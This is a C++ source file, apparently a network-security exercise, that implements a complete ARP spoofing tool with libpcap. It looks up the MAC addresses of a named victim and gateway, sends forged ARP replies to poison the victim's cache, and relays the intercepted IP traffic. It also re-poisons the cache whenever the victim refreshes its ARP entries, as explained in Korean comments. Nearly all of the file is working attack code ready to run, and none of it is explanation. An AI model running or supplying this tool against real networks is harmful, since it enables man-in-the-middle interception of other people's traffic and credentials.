/* send ARP reply for ARP spoofing */
#define DEBUG 0
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <arpa/inet.h>
#include <pcap.h>

#include <linux/if_ether.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include "packet.h"
#include "sysinfo.h"

using namespace packet;
using sysinfo::getDevMac;
using sysinfo::getSrcIPStr;


void printMacAddr(const char *, uint8_t *);
void printPacket(u_char *p, int len);
inline clock_t timeslice(clock_t last);

class ArpHandler {
  public:
	const char *BROADCAST_ETH_STR   = "ff:ff:ff:ff:ff:ff";
	const char *ARP_REQ_DST_MAC_STR = "00:00:00:00:00:00";
	enum Len {
		ETH_HEADER      = 14, // 6 + 6 + 2
		IP_STR_BUF      = 16,
		MAC_STR_BUF     = 18
	};
	enum ArpOpcode {
		REQUEST = 0x0001,
		REPLY   = 0x0002
	};

  protected:
	pcap_t *handle;
	char *dev;
	char my_ip_str[Len::IP_STR_BUF];
	char my_mac_str[Len::MAC_STR_BUF];

  public:	
	ArpHandler(pcap_t *_handle, char *_dev) {
		this->handle = _handle;
		this->dev = _dev;
		getSrcIPStr(dev, my_ip_str);
		getDevMac(dev, my_mac_str);
	}
	int sendARPRequest(char *dst_ip_str) {
		EthArpPacket packet;
		fillEthHeader(&packet.eth, my_mac_str, BROADCAST_ETH_STR, ETH_P_ARP);
		fillArpPacket(&packet.arp, my_mac_str, ARP_REQ_DST_MAC_STR, my_ip_str, dst_ip_str, ArpOpcode::REQUEST);
		// printPacket((u_char *)&packet, sizeof(EthArpPacket));
		if (pcap_sendpacket(handle, (u_char *)&packet, sizeof(EthArpPacket)) == -1) {
			throw pcap_geterr(handle);
		}
		return 1;
	}
	int recvARPReply(char *sender_ip_str, char *mac_str) {
		/**
		 * input  : sender_ip_str
		 * output : mac_str (indirect)
		 * */
		printf("[*] wating %s's ARP reply to get mac address", sender_ip_str);
		clock_t start = clock();
		clock_t point = clock();
		int time_cnt = 0;
		while (timeslice(start) < 30) {
			// printf("%d\n", timeslice(start));
			struct pcap_pkthdr *header;
			const u_char *recv_packet;

			int res = pcap_next_ex(handle, &header, &recv_packet);
			if (res == 0)
				continue;
			if (res == -1 || res == -2)
				throw "recvARPReply res == -1 || res == -2";

			EthHeader *eth = (EthHeader *)recv_packet;
			if (eth->ether_type == htons(ETH_P_ARP)) {
				if (DEBUG == 1) {
					printf("==== recvARPReply ====\n");
					printPacket((u_char *)recv_packet, sizeof(EthArpPacket));
				}
				ArpPacket *arp = (ArpPacket *)(recv_packet + Len::ETH_HEADER);
				// in this case, inet_ntoa is better than inet_ntop
				if (arp->opcode == htons(ArpOpcode::REPLY)) {
					struct in_addr src_ip;
					src_ip.s_addr = arp->src_ip;
					if (!strncmp(inet_ntoa(src_ip), sender_ip_str, Len::IP_STR_BUF - 1)) {
						strncpy(mac_str, ether_ntoa((ether_addr *)arp->src_mac), Len::MAC_STR_BUF - 1);
						printf("\n");
						return 1;
					}
				}
			}
			if (timeslice(point) > 1) {
				putc('.', stdout);
				fflush(stdout);
				point = clock();
			}
		}
		throw "recvARPReply exceed time";
	}
};

class ArpSpoofer : public ArpHandler {
	private:
	char *sender_ip_str;
	char *target_ip_str;
	char sender_mac_str[Len::MAC_STR_BUF];
	char target_mac_str[Len::MAC_STR_BUF];
	clock_t last;
	public:
	ArpSpoofer(pcap_t *_handle, char *_dev, char *_sender_ip_str, char *_target_ip_str) : 
			ArpHandler(_handle, _dev) {
		sender_ip_str = _sender_ip_str;
		target_ip_str = _target_ip_str;
	}
	void autoARPInfection() {
		try {
			sendARPRequest(sender_ip_str);
			recvARPReply(sender_ip_str, sender_mac_str);
			sendARPRequest(target_ip_str);
			recvARPReply(target_ip_str, target_mac_str);
			sendARPInfection(ArpOpcode::REPLY);
		} catch(const char *errmsg) {
			fprintf(stderr, "\n[ERROR] %s\n", errmsg);
			exit(EXIT_FAILURE);
		};
	}
	int sendARPInfection(ArpOpcode opcode) {
		///////////////// SEND ARP REPLY ( ARP SPOOFING )
		EthArpPacket packet;
		fillEthHeader(&packet.eth, my_mac_str, sender_mac_str, ETH_P_ARP);
		fillArpPacket(&packet.arp, my_mac_str, sender_mac_str, target_ip_str, sender_ip_str, opcode);
		printf("[*] Send ARP Infection Packet to %s\n", sender_ip_str);
		if (DEBUG == 1) {
			printPacket((u_char *)&packet, sizeof(EthArpPacket));
		}
		if (pcap_sendpacket(handle, (u_char *)&packet, sizeof(EthArpPacket)) == -1) {
			throw pcap_geterr(handle);
		}
		this->last = clock();
		return 1;
	}
	static int relayLoop(ArpSpoofer **sess, int num_of_sessions) {
		struct pcap_pkthdr *header;
		const u_char *recv_packet;
		while (true) {
			int res = pcap_next_ex(sess[0]->handle, &header, &recv_packet);
			if (res == 0)
				continue;
			if (res == -1 || res == -2)
				return -1;
			EthHeader *eth = (EthHeader *)recv_packet;
			if (eth->ether_type == htons(ETH_P_IP) && !memcmp(eth->dst_addr, ether_aton(sess[0]->my_mac_str), packet::Len::MAC_ADDR)) {
			/** check whether relay or not **/
				if (DEBUG == 1) {
					::printPacket((u_char *)recv_packet, header->len);
				}
				struct ip *ip = (struct ip *)(recv_packet + Len::ETH_HEADER);
				int i = checkRelay(ip, sess, num_of_sessions);
				if (i != -1) {	
					fillEthHeader(eth, sess[i]->my_mac_str, sess[i]->target_mac_str);
					if (pcap_sendpacket(sess[i]->handle, (u_char *)recv_packet, header->len) == -1) {
						fprintf(stderr, "[ERROR] %s", pcap_geterr(sess[i]->handle));
						exit(EXIT_FAILURE);
					}
				}
			}
			else if (eth->ether_type == htons(ETH_P_ARP)) {
			/** check re-infect or not **/
				ArpPacket *arp = (ArpPacket *)(recv_packet + Len::ETH_HEADER);
				handleReinfection(arp, sess, num_of_sessions);
			}

			/** periodic re-infection **/
			for (int i = 0; i < num_of_sessions; i++) {
				if (timeslice(sess[i]->last) > 600) {
					sess[i]->sendARPInfection(ArpOpcode::REPLY);
				}
			}
		}
	}
	static int checkRelay(struct ip *ip, ArpSpoofer **sess, int num_of_sessions) {
		for (int i = 0; i < num_of_sessions; i++) {
			// strcmp는 같으면 0이다.
			if (!strcmp(inet_ntoa(ip->ip_src), sess[i]->sender_ip_str) && strcmp(inet_ntoa(ip->ip_dst), sess[i]->my_ip_str)) {
				return i;
			}
		}
		return -1;  // there is no packet to be relaied.
	}

	static int handleReinfection(ArpPacket *arp, ArpSpoofer **sess, int num_of_sessions) {
		/** sender가 ARP reply를 수신할 때 까지 기다렸다가 감염시켜야 확실할 것 같은데, 꼭 그렇지는 않다.
		 * 1. sender -> target로 ARP request. 이 경우 이미 infection 되어 있다면 attacker에게 1:1로 request를 보내므로 이 시점에서 다시 infection.
		 * 2. target -> sender로 ARP request. 이 경우 broadcast로 날리기 때문에 sender가 request를 수신하면서 arp table 갱신이 발생한다.
		 *    따라서 이 때 다시 infection 시키면 된다. 주의할 점은 테스트 환경에서는 REPLY로 날리면 갱신이 안됐다. REQUEST로 날려야 제대로 infection 되었다.
		 *    그래서 둘을 구분해주었다.
		 */
		struct in_addr src_ip;
		src_ip.s_addr = arp->src_ip;
		struct in_addr dst_ip;
		dst_ip.s_addr = arp->dst_ip;
		for (int i = 0; i < num_of_sessions; i++) {
			if ((!strcmp(inet_ntoa(src_ip), sess[i]->sender_ip_str) && !strcmp(inet_ntoa(dst_ip), sess[i]->target_ip_str))) {
				sess[i]->sendARPInfection(ArpOpcode::REPLY);
				return i;
			}
			else if (!strcmp(inet_ntoa(src_ip), sess[i]->target_ip_str) && !strcmp(inet_ntoa(dst_ip), sess[i]->sender_ip_str)) {
				sess[i]->sendARPInfection(ArpOpcode::REQUEST);
				return i;
			}
		}
		return -1;
	}
};


void usage(char *fname) {
	printf("syntax: %s <interface> <sender ip(victim)> <target ip(gateway)>\n", fname);
	printf("sample: %s wlan0 192.168.110.129 192.168.110.1\n", fname);
}

int main(int argc, char *argv[]) {
	if ((argc % 2 != 0) || argc < 4) {
		usage(argv[0]);
		return -1;
	}

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	int num_of_sessions = (argc - 2) / 2;
	ArpSpoofer * sess[num_of_sessions];
	printf("[*] the number of spoofing sessions : %d\n", num_of_sessions);
	for (int i = 0; i < num_of_sessions; i++) {
		sess[i] = new ArpSpoofer(handle, dev, argv[2+(i*2)], argv[2+(i*2)+1]);
		sess[i]->autoARPInfection();
	}

	printf("[*] Done. run relay loop\n");
	ArpSpoofer::relayLoop(sess, num_of_sessions);

	for (int i = 0; i < num_of_sessions; i++) {
		delete sess[i];
	}
	pcap_close(handle);
	return 0;
}



void printMacAddr(const char *str, uint8_t *a) {
	printf("%s", str);
	printf("%02x:%02x:%02x:%02x:%02x:%02x\n", a[0], a[1], a[2], a[3], a[4], a[5]);
}

void printPacket(u_char *p, int len) {
	int i;
	for (i = 1; i < len; i++) {
		printf("%02x ", p[i - 1]);
		if (i % 16 == 0) {
			printf("\n");
		}
	}
	printf("%02x ", p[i]);
	printf("\n");
}

inline clock_t timeslice(clock_t last) {
	return (clock() - last) / 10;
	// return (clock() - last) / CLOCKS_PER_SEC;
}